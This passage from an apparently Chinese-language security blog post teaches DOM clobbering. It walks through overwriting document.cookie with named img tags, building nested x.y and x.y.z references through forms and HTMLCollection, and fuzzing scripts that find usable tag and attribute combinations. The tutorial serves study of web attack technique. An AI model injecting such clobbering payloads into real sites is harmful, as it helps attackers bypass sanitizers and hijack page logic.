+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>img</span> <span class=na>id </span><span class=o>=</span> <span class=s>x</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>img</span> <span class=na>name </span><span class=o>=</span> <span class=s>y</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>    <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=nx>x</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=nx>y</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=nb>document</span><span class=p>.</span><span class=nx>x</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=nb>document</span><span class=p>.</span><span class=nx>y</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=nb>window</span><span class=p>.</span><span class=nx>x</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=nb>window</span><span class=p>.</span><span class=nx>y</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
+</span></span></code></pre></td></tr></table></div></div><p>我们定义id和name属性</p><p>然后通过这种办法，来覆盖原有的值</p><p><img src=/p/dom-clobbering/image-20250809142538823_hu_4a3c58fe33bbe4e.webp width=875 height=264 srcset="/p/dom-clobbering/image-20250809142538823_hu_d4c89fff23db1155.webp 480w, /p/dom-clobbering/image-20250809142538823_hu_4a3c58fe33bbe4e.webp 875w" sizes="(min-width: 1280px) 800px, (min-width: 768px) 65vw, calc(100vw - 30px)" data-full-src=/p/dom-clobbering/image-20250809142538823_hu_4a3c58fe33bbe4e.webp data-full-width=875 data-full-height=264 loading=lazy decoding=async alt=image-20250809142538823 class=gallery-image data-flex-grow=331 data-flex-basis=795px></p><p>先创建一个div，然后把这个div插入到body中，再获取cookie时 不再获取js原先提供的cookie 而是把img获取到了。</p><p><strong>document.cookie 已经被我们用img 标签给覆盖了</strong></p><p>这里相当与我们把前面定义的name的值从y改成了cookie,document.y获取到<code>&lt;img name = "y"></code>，那么document.cookie不就获取到了<code>&lt;img name = "cookie"></code></p><h2 id=前置知识>前置知识</h2><p>既然我们可以通过这种方式去创建或者覆盖 document 或者 window 对象的某些值，但是看起来我们举的例子只是利用标签创建或者覆盖最终得到的也是标签，是一个<code>HTMLElment</code>对象。</p><p><img src=/p/dom-clobbering/image-20250809142737609_hu_3af1551f539724c1.webp width=516 height=50 srcset="/p/dom-clobbering/image-20250809142737609_hu_4bda07bd7ac0d263.webp 480w, /p/dom-clobbering/image-20250809142737609_hu_3af1551f539724c1.webp 516w" sizes="(min-width: 1280px) 800px, (min-width: 768px) 65vw, calc(100vw - 30px)" data-full-src=/p/dom-clobbering/image-20250809142737609_hu_3af1551f539724c1.webp data-full-width=516 data-full-height=50 loading=lazy decoding=async alt=image-20250809142737609 class=gallery-image data-flex-grow=1032 data-flex-basis=2476px></p><p>但是对于大多数情况来说，我们可能更需要将其转换为一个可控的字符串类型，以便我们进行操作。</p><h3 id=tostring>toString</h3><p>我们可以通过以下代码来进行 fuzz 得到可以通过<code>toString</code>方法将其转换成字符串类型的标签</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=nb>Object</span><span class=p>.</span><span class=nx>getOwnPropertyNames</span><span class=p>(</span><span class=nb>window</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>.</span><span class=nx>filter</span><span class=p>(</span><span class=nx>p</span> <span class=p>=&gt;</span> <span class=nx>p</span><span class=p>.</span><span class=nx>match</span><span class=p>(</span><span class=sr>/Element$/</span><span class=p>))</span>
+</span></span><span class=line><span class=cl><span class=p>.</span><span class=nx>map</span><span class=p>(</span><span class=nx>p</span> <span class=p>=&gt;</span> <span class=nb>window</span><span class=p>[</span><span class=nx>p</span><span class=p>])</span>
+</span></span><span class=line><span class=cl><span class=p>.</span><span class=nx>filter</span><span class=p>(</span><span class=nx>p</span> <span class=p>=&gt;</span> <span class=nx>p</span> <span class=o>&amp;&amp;</span> <span class=nx>p</span><span class=p>.</span><span class=nx>prototype</span> <span class=o>&amp;&amp;</span> <span class=nx>p</span><span class=p>.</span><span class=nx>prototype</span><span class=p>.</span><span class=nx>toString</span> <span class=o>!==</span> <span class=nb>Object</span><span class=p>.</span><span class=nx>prototype</span><span class=p>.</span><span class=nx>toString</span><span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div><p>然后返回了两个函数</p><p><img src=/p/dom-clobbering/image-20250809143850661_hu_e552f81ba6a21376.webp width=906 height=182 srcset="/p/dom-clobbering/image-20250809143850661_hu_eb4e361b053e70be.webp 480w, /p/dom-clobbering/image-20250809143850661_hu_e552f81ba6a21376.webp 906w" sizes="(min-width: 1280px) 800px, (min-width: 768px) 65vw, calc(100vw - 30px)" data-full-src=/p/dom-clobbering/image-20250809143850661_hu_e552f81ba6a21376.webp data-full-width=906 data-full-height=182 loading=lazy decoding=async alt=image-20250809143850661 class=gallery-image data-flex-grow=497 data-flex-basis=1194px></p><p>第一个标签其实就是area,跟br那些一样，是空元素，利用不了，第二个是a标签，可以用href来进行字符串转换</p><h3 id=htmlcollection>HTMLCollection</h3><p>但是如果我们需要的是x.y 这种形式呢？两层结构我们应该怎么办呢？我们可以尝试上述的办法：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>body</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>div</span> <span class=na>id</span><span class=o>=</span><span class=s>x</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>        <span class=p>&lt;</span><span class=nt>a</span> <span class=na>id</span><span class=o>=</span><span class=s>y</span>  <span class=na>href</span><span class=o>=</span><span class=s>&#34;hajimi&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>a</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>    <span class=p>&lt;/</span><span class=nt>div</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>body</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>    <span class=nx>alert</span><span class=p>(</span><span class=nx>x</span><span class=p>.</span><span class=nx>y</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
+</span></span></code></pre></td></tr></table></div></div><p>这里无论第一个标签怎么组合，得到的结果都只是<code>undefined</code>。但是我们可以通过另一种方法加入引入 name 属性就会有其他的效果。</p><p><code>HTMLCollection</code>是一个<code>element</code>的“集合”类,值得注意的是我们可以通过<code>collection[name]</code>的形式来调用其中的元素，所以我们似乎可以通过先构建一个<code>HTMLCollection</code>，再通过<code>collection[name]</code>的形式来调用。</p><p>也就是说把上面代码改成</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>body</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>div</span> <span class=na>id</span><span class=o>=</span><span class=s>&#34;x&#34;</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>        <span class=p>&lt;</span><span class=nt>a</span> <span class=na>id</span><span class=o>=</span><span class=s>&#34;x&#34;</span> <span class=na>name </span><span class=o>=</span> <span class=s>y</span>  <span class=na>href</span><span class=o>=</span><span class=s>&#34;hajimi&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>a</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>    <span class=p>&lt;/</span><span class=nt>div</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>body</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>    <span class=nx>alert</span><span class=p>(</span><span class=nx>x</span><span class=p>.</span><span class=nx>y</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
+</span></span></code></pre></td></tr></table></div></div><h3 id=html-relationships>HTML Relationships</h3><p>我们也可以通过利用 HTML 标签之间存在的关系来构建层级关系。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=kd>var</span> <span class=nx>log</span><span class=o>=</span><span class=p>[];</span>
+</span></span><span class=line><span class=cl><span class=kd>var</span> <span class=nx>html</span> <span class=o>=</span> <span class=p>[</span><span class=s2>&#34;a&#34;</span><span class=p>,</span><span class=s2>&#34;abbr&#34;</span><span class=p>,</span><span class=s2>&#34;acronym&#34;</span><span class=p>,</span><span class=s2>&#34;address&#34;</span><span class=p>,</span><span class=s2>&#34;applet&#34;</span><span class=p>,</span><span class=s2>&#34;area&#34;</span><span class=p>,</span><span class=s2>&#34;article&#34;</span><span class=p>,</span><span class=s2>&#34;aside&#34;</span><span class=p>,</span><span class=s2>&#34;audio&#34;</span><span class=p>,</span><span class=s2>&#34;b&#34;</span><span class=p>,</span><span class=s2>&#34;base&#34;</span><span class=p>,</span><span class=s2>&#34;basefont&#34;</span><span class=p>,</span><span class=s2>&#34;bdi&#34;</span><span class=p>,</span><span class=s2>&#34;bdo&#34;</span><span class=p>,</span><span class=s2>&#34;bgsound&#34;</span><span class=p>,</span><span class=s2>&#34;big&#34;</span><span class=p>,</span><span class=s2>&#34;blink&#34;</span><span class=p>,</span><span class=s2>&#34;blockquote&#34;</span><span class=p>,</span><span class=s2>&#34;body&#34;</span><span class=p>,</span><span class=s2>&#34;br&#34;</span><span class=p>,</span><span class=s2>&#34;button&#34;</span><span class=p>,</span><span class=s2>&#34;canvas&#34;</span><span class=p>,</span><span class=s2>&#34;caption&#34;</span><span class=p>,</span><span class=s2>&#34;center&#34;</span><span class=p>,</span><span class=s2>&#34;cite&#34;</span><span class=p>,</span><span class=s2>&#34;code&#34;</span><span class=p>,</span><span class=s2>&#34;col&#34;</span><span class=p>,</span><span class=s2>&#34;colgroup&#34;</span><span class=p>,</span><span class=s2>&#34;command&#34;</span><span class=p>,</span><span class=s2>&#34;content&#34;</span><span class=p>,</span><span class=s2>&#34;data&#34;</span><span class=p>,</span><span class=s2>&#34;datalist&#34;</span><span class=p>,</span><span class=s2>&#34;dd&#34;</span><span class=p>,</span><span class=s2>&#34;del&#34;</span><span class=p>,</span><span class=s2>&#34;details&#34;</span><span class=p>,</span><span class=s2>&#34;dfn&#34;</span><span class=p>,</span><span class=s2>&#34;dialog&#34;</span><span class=p>,</span><span class=s2>&#34;dir&#34;</span><span class=p>,</span><span class=s2>&#34;div&#34;</span><span class=p>,</span><span class=s2>&#34;dl&#34;</span><span class=p>,</span><span class=s2>&#34;dt&#34;</span><span class=p>,</span><span class=s2>&#34;element&#34;</span><span class=p>,</span><span class=s2>&#34;em&#34;</span><span class=p>,</span><span class=s2>&#34;embed&#34;</span><span class=p>,</span><span class=s2>&#34;fieldset&#34;</span><span class=p>,</span><span class=s2>&#34;figcaption&#34;</span><span class=p>,</span><span class=s2>&#34;figure&#34;</span><span class=p>,</span><span class=s2>&#34;font&#34;</span><span class=p>,</span><span class=s2>&#34;footer&#34;</span><span class=p>,</span><span class=s2>&#34;form&#34;</span><span class=p>,</span><span class=s2>&#34;frame&#34;</span><span class=p>,</span><span class=s2>&#34;frameset&#34;</span><span class=p>,</span><span class=s2>&#34;h1&#34;</span><span class=p>,</span><span class=s2>&#34;head&#34;</span><span class=p>,</span><span class=s2>&#34;header&#34;</span><span class=p>,</span><span class=s2>&#34;hgroup&#34;</span><span class=p>,</span><span class=s2>&#34;hr&#34;</span><span class=p>,</span><span class=s2>&#34;html&#34;</span><span class=p>,</span><span class=s2>&#34;i&#34;</span><span class=p>,</span><span class=s2>&#34;iframe&#34;</span><span class=p>,</span><span class=s2>&#34;image&#34;</span><span class=p>,</span><span class=s2>&#34;img&#34;</span><span class=p>,</span><span class=s2>&#34;input&#34;</span><span class=p>,</span><span class=s2>&#34;ins&#34;</span><span class=p>,</span><span class=s2>&#34;isindex&#34;</span><span class=p>,</span><span class=s2>&#34;kbd&#34;</span><span class=p>,</span><span class=s2>&#34;keygen&#34;</span><span class=p>,</span><span class=s2>&#34;label&#34;</span><span class=p>,</span><span class=s2>&#34;legend&#34;</span><span class=p>,</span><span class=s2>&#34;li&#34;</span><span class=p>,</span><span class=s2>&#34;link&#34;</span><span class=p>,</span><span class=s2>&#34;listing&#34;</span><span class=p>,</span><span class=s2>&#34;main&#34;</span><span class=p>,</span><span class=s2>&#34;map&#34;</span><span class=p>,</span><span class=s2>&#34;mark&#34;</span><span class=p>,</span><span class=s2>&#34;marquee&#34;</span><span class=p>,</span><span class=s2>&#34;menu&#34;</span><span class=p>,</span><span class=s2>&#34;menuitem&#34;</span><span class=p>,</span><span class=s2>&#34;meta&#34;</span><span class=p>,</span><span class=s2>&#34;meter&#34;</span><span class=p>,</span><span class=s2>&#34;multicol&#34;</span><span class=p>,</span><span class=s2>&#34;nav&#34;</span><span class=p>,</span><span class=s2>&#34;nextid&#34;</span><span class=p>,</span><span class=s2>&#34;nobr&#34;</span><span class=p>,</span><span class=s2>&#34;noembed&#34;</span><span class=p>,</span><span class=s2>&#34;noframes&#34;</span><span class=p>,</span><span class=s2>&#34;noscript&#34;</span><span class=p>,</span><span class=s2>&#34;object&#34;</span><span class=p>,</span><span class=s2>&#34;ol&#34;</span><span class=p>,</span><span class=s2>&#34;optgroup&#34;</span><span class=p>,</span><span class=s2>&#34;option&#34;</span><span class=p>,</span><span class=s2>&#34;output&#34;</span><span class=p>,</span><span class=s2>&#34;p&#34;</span><span class=p>,</span><span class=s2>&#34;param&#34;</span><span class=p>,</span><span class=s2>&#34;picture&#34;</span><span class=p>,</span><span class=s2>&#34;plaintext&#34;</span><span class=p>,</span><span class=s2>&#34;pre&#34;</span><span class=p>,</span><span class=s2>&#34;progress&#34;</span><span class=p>,</span><span class=s2>&#34;q&#34;</span><span class=p>,</span><span class=s2>&#34;rb&#34;</span><span class=p>,</span><span class=s2>&#34;rp&#34;</span><span class=p>,</span><span class=s2>&#34;rt&#34;</span><span class=p>,</span><span class=s2>&#34;rtc&#34;</span><span class=p>,</span><span class=s2>&#34;ruby&#34;</span><span class=p>,</span><span class=s2>&#34;s&#34;</span><span class=p>,</span><span class=s2>&#34;samp&#34;</span><span class=p>,</span><span class=s2>&#34;script&#34;</span><span class=p>,</span><span class=s2>&#34;section&#34;</span><span class=p>,</span><span class=s2>&#34;select&#34;</span><span class=p>,</span><span class=s2>&#34;shadow&#34;</span><span class=p>,</span><span class=s2>&#34;slot&#34;</span><span class=p>,</span><span class=s2>&#34;small&#34;</span><span class=p>,</span><span class=s2>&#34;source&#34;</span><span class=p>,</span><span class=s2>&#34;spacer&#34;</span><span class=p>,</span><span class=s2>&#34;span&#34;</span><span class=p>,</span><span class=s2>&#34;strike&#34;</span><span class=p>,</span><span class=s2>&#34;strong&#34;</span><span class=p>,</span><span class=s2>&#34;style&#34;</span><span class=p>,</span><span class=s2>&#34;sub&#34;</span><span class=p>,</span><span class=s2>&#34;summary&#34;</span><span class=p>,</span><span class=s2>&#34;sup&#34;</span><span class=p>,</span><span class=s2>&#34;svg&#34;</span><span class=p>,</span><span class=s2>&#34;table&#34;</span><span class=p>,</span><span class=s2>&#34;tbody&#34;</span><span class=p>,</span><span class=s2>&#34;td&#34;</span><span class=p>,</span><span class=s2>&#34;template&#34;</span><span class=p>,</span><span class=s2>&#34;textarea&#34;</span><span class=p>,</span><span class=s2>&#34;tfoot&#34;</span><span class=p>,</span><span class=s2>&#34;th&#34;</span><span class=p>,</span><span class=s2>&#34;thead&#34;</span><span class=p>,</span><span class=s2>&#34;time&#34;</span><span class=p>,</span><span class=s2>&#34;title&#34;</span><span class=p>,</span><span class=s2>&#34;tr&#34;</span><span class=p>,</span><span class=s2>&#34;track&#34;</span><span class=p>,</span><span class=s2>&#34;tt&#34;</span><span class=p>,</span><span class=s2>&#34;u&#34;</span><span class=p>,</span><span class=s2>&#34;ul&#34;</span><span class=p>,</span><span class=s2>&#34;var&#34;</span><span class=p>,</span><span class=s2>&#34;video&#34;</span><span class=p>,</span><span class=s2>&#34;wbr&#34;</span><span class=p>,</span><span class=s2>&#34;xmp&#34;</span><span class=p>],</span> <span class=nx>logs</span> <span class=o>=</span> <span class=p>[];</span>
+</span></span><span class=line><span class=cl><span class=nx>div</span><span class=o>=</span><span class=nb>document</span><span class=p>.</span><span class=nx>createElement</span><span class=p>(</span><span class=s1>&#39;div&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=k>for</span><span class=p>(</span><span class=kd>var</span> <span class=nx>i</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span><span class=nx>i</span><span class=o>&lt;</span><span class=nx>html</span><span class=p>.</span><span class=nx>length</span><span class=p>;</span><span class=nx>i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=k>for</span><span class=p>(</span><span class=kd>var</span> <span class=nx>j</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span><span class=nx>j</span><span class=o>&lt;</span><span class=nx>html</span><span class=p>.</span><span class=nx>length</span><span class=p>;</span><span class=nx>j</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nx>div</span><span class=p>.</span><span class=nx>innerHTML</span><span class=o>=</span><span class=s1>&#39;&lt;&#39;</span><span class=o>+</span><span class=nx>html</span><span class=p>[</span><span class=nx>i</span><span class=p>]</span><span class=o>+</span><span class=s1>&#39; id=element1&gt;&#39;</span><span class=o>+</span><span class=s1>&#39;&lt;&#39;</span><span class=o>+</span><span class=nx>html</span><span class=p>[</span><span class=nx>j</span><span class=p>]</span><span class=o>+</span><span class=s1>&#39; id=element2&gt;&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=nb>document</span><span class=p>.</span><span class=nx>body</span><span class=p>.</span><span class=nx>appendChild</span><span class=p>(</span><span class=nx>div</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=nb>window</span><span class=p>.</span><span class=nx>element1</span> <span class=o>&amp;&amp;</span> <span class=nx>element1</span><span class=p>.</span><span class=nx>element2</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>       <span class=nx>log</span><span class=p>.</span><span class=nx>push</span><span class=p>(</span><span class=nx>html</span><span class=p>[</span><span class=nx>i</span><span class=p>]</span><span class=o>+</span><span class=s1>&#39;,&#39;</span><span class=o>+</span><span class=nx>html</span><span class=p>[</span><span class=nx>j</span><span class=p>]);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=nb>document</span><span class=p>.</span><span class=nx>body</span><span class=p>.</span><span class=nx>removeChild</span><span class=p>(</span><span class=nx>div</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=nx>log</span><span class=p>.</span><span class=nx>join</span><span class=p>(</span><span class=s1>&#39;\n&#39;</span><span class=p>));</span>
+</span></span></code></pre></td></tr></table></div></div><p>以上代码测试了现在 HTML5 基本上所有的标签，使用两层的层级关系进行 fuzz ，注意这里只使用了<code>id</code>，并没有使用<code>name</code>，与上文的<code>HTMLCollection</code>并不是一种方法。</p><p>我们可以得到的是以下关系：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span><span class=lnt>9
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>form-&gt;button
+</span></span><span class=line><span class=cl>form-&gt;fieldset
+</span></span><span class=line><span class=cl>form-&gt;image
+</span></span><span class=line><span class=cl>form-&gt;img
+</span></span><span class=line><span class=cl>form-&gt;input
+</span></span><span class=line><span class=cl>form-&gt;object
+</span></span><span class=line><span class=cl>form-&gt;output
+</span></span><span class=line><span class=cl>form-&gt;select
+</span></span><span class=line><span class=cl>form-&gt;textarea
+</span></span></code></pre></td></tr></table></div></div><p>如果我们想要构建<code>x.y</code>的形式，我们可以这么构建：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>form</span> <span class=na>id</span><span class=o>=</span><span class=s>x</span><span class=p>&gt;&lt;</span><span class=nt>output</span> <span class=na>id</span><span class=o>=</span><span class=s>y</span><span class=p>&gt;</span>I&#39;ve been clobbered<span class=p>&lt;/</span><span class=nt>output</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl><span class=nx>alert</span><span class=p>(</span><span class=nx>x</span><span class=p>.</span><span class=nx>y</span><span class=p>.</span><span class=nx>value</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
+</span></span></code></pre></td></tr></table></div></div><h3 id=三级关系xyz的写法>三级关系x.y.z的写法</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>form</span> <span class=na>id</span><span class=o>=</span><span class=s>&#34;x&#34;</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;y&#34;</span><span class=p>&gt;&lt;</span><span class=nt>output</span> <span class=na>id</span><span class=o>=</span><span class=s>z</span><span class=p>&gt;</span>I&#39;ve been clobbered<span class=p>&lt;/</span><span class=nt>output</span><span class=p>&gt;&lt;/</span><span class=nt>form</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>form</span> <span class=na>id</span><span class=o>=</span><span class=s>&#34;x&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>form</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span> 
+</span></span><span class=line><span class=cl>    <span class=nx>alert</span><span class=p>(</span><span class=nx>x</span><span class=p>.</span><span class=nx>y</span><span class=p>.</span><span class=nx>z</span><span class=p>.</span><span class=nx>value</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
+</span></span></code></pre></td></tr></table></div></div><h3 id=自定义属性构造>自定义属性构造</h3><p>以上我们都是通过 id 或者 name 来利用，那我们能不能通过自定义属性来构造呢？</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>form</span> <span class=na>id</span><span class=o>=</span><span class=s>x</span> <span class=na>y</span><span class=o>=</span><span class=s>123</span><span class=p>&gt;&lt;/</span><span class=nt>form</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl><span class=nx>alert</span><span class=p>(</span><span class=nx>x</span><span class=p>.</span><span class=nx>y</span><span class=p>)</span><span class=c1>//undefined
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
+</span></span></code></pre></td></tr></table></div></div><p>很明显，这意味着任何未定义的属性都不会具有 DOM 属性，所以就返回了 <code>undefined</code></p><p>我们可以尝试一下 fuzz 所有标签的有没有字符串类型的属性可供我们使用：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=kd>var</span> <span class=nx>html</span> <span class=o>=</span> <span class=p>[...]</span><span class=c1>//HTML elements array
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kd>var</span> <span class=nx>props</span><span class=o>=</span><span class=p>[];</span>
+</span></span><span class=line><span class=cl><span class=k>for</span><span class=p>(</span><span class=nx>i</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span><span class=nx>i</span><span class=o>&lt;</span><span class=nx>html</span><span class=p>.</span><span class=nx>length</span><span class=p>;</span><span class=nx>i</span><span class=o>++</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>  <span class=nx>obj</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>createElement</span><span class=p>(</span><span class=nx>html</span><span class=p>[</span><span class=nx>i</span><span class=p>]);</span>
+</span></span><span class=line><span class=cl>  <span class=k>for</span><span class=p>(</span><span class=nx>prop</span> <span class=k>in</span> <span class=nx>obj</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=k>if</span><span class=p>(</span><span class=k>typeof</span> <span class=nx>obj</span><span class=p>[</span><span class=nx>prop</span><span class=p>]</span> <span class=o>===</span> <span class=s1>&#39;string&#39;</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>   <span class=k>try</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nx>DOM</span><span class=p>.</span><span class=nx>innerHTML</span> <span class=o>=</span> <span class=s1>&#39;&lt;&#39;</span><span class=o>+</span><span class=nx>html</span><span class=p>[</span><span class=nx>i</span><span class=p>]</span><span class=o>+</span><span class=s1>&#39; id=x &#39;</span><span class=o>+</span><span class=nx>prop</span><span class=o>+</span><span class=s1>&#39;=1&gt;&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=nb>document</span><span class=p>.</span><span class=nx>getElementById</span><span class=p>(</span><span class=s1>&#39;x&#39;</span><span class=p>)[</span><span class=nx>prop</span><span class=p>]</span> <span class=o>==</span> <span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
